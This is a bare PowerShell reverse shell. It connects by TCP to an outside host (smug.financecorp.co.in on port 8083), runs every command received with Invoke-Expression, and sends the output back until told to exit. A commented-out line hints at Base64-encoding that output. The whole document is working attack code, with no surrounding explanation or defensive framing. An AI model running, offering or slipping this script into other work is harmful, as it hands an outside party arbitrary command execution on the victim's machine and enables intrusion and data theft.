$client = New-Object System.Net.Sockets.TCPClient("smug.financecorp.co.in",8083)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.AsciiEncoding

$writer.Write("Connection established!")
$writer.Flush()

while ($true) {
    $read = $stream.Read($buffer, 0, 1024)
    $command = $encoding.GetString($buffer, 0, $read)
    if ($command -eq "exit") { break }
    $output = Invoke-Expression -Command $command 2>&1
    $output += "`r`n"
    #$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
    $writer.Write($output)
    $writer.Flush()
}

$client.Close()
